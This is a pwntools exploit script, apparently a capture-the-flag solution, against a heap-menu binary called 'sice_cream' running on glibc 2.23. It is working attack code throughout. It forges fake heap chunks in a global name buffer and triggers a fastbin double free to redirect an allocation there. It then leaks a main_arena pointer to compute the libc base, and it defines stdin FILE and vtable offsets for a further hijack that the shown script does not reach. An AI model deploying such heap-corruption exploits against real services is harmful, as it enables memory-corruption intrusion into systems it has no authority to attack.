#!/usr/bin/env python3

from pwn import *

exe = ELF("./sice_cream_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.terminal = ["tmux", "splitw", "-h", "-F", "#{paneid}", "-P"]
context.binary = exe

GDB_ARGS = """c
"""

NAME_ADDR = 0x602040
ARRAY_ADDR = 0x602140

MAIN_ARENA_OFFSET = 0x3C4B78
STDIN_FILE_OFFSET = 0x3c48e0

VTABLE_OFFSET_FROM_FILE = 0xD8

r = None

def conn():
    global r
    if args.LOCAL:
        r = gdb.debug([exe.path], GDB_ARGS)
    else:
        r = remote("addr", 1337)

    return r

def buy_sicecream(size: int, flavor: bytes):
    r.sendlineafter("> ", b'1')
    r.sendlineafter("> ", str(size).encode())
    r.sendlineafter("> ", flavor)

def eat_sicecream(idx: int):
    r.sendlineafter("> ", b'2')
    r.sendlineafter("> ", str(idx).encode())

def reintroduce(name: bytes):
    r.sendlineafter("> ", b'3')
    r.sendlineafter("> ", name)

def introduce(name: bytes):
    r.sendafter("> ", name)

def forge_chunk(size, fd, bk):
    return p64(0x0) + p64(size) + p64(fd) + p64(bk)

def generate_offset():
    pattern = b""
    for c in range(ord("a"), ord("q")):
        pattern += chr(c).encode()*2

    return pattern

def main():
    global r
    r = conn()

    # enter name
    info("Entering name")
    print(r.recvuntil(">").decode())
    r.sendline(forge_chunk(0x101, 0x0, 0x0) + \
        b"A"*(0x100-0x30-32) + forge_chunk(0x61, 0x0, 0xA))

    buy_sicecream(88, b"red")
    buy_sicecream(88, b"trash")

    eat_sicecream(0)
    eat_sicecream(1)
    eat_sicecream(0) # double free exploit

    info("Changing pointer")
    buy_sicecream(88, p64(NAME_ADDR+0x100-0x30))

    buy_sicecream(88, b"yellow")
    buy_sicecream(88, b"orange")
    buy_sicecream(88, generate_offset() + b"A"*8 + p64(NAME_ADDR + 0x10))
    
    reintroduce(forge_chunk(0x91, 0, 0) + 0x78 * b'a' + p64(0x21) + p64(0x91) + p64(0x91))
    eat_sicecream(1)

    # leak arena index
    info("Leaking arena address")
    reintroduce(b"A"*15)
    info("----------------------------")
    r.recvuntil(b"!")
    arena_addr = u64(r.recvuntil(b"!").split(b"\n")[1][:-1].ljust(8, b"\x00"))
    info(f"{hex(arena_addr)=}")
    info("----------------------------")

    libc_ptr = arena_addr - MAIN_ARENA_OFFSET
    info(f"{hex(libc_ptr)}")

    r.interactive()

if __name__ == "__main__":
    main()
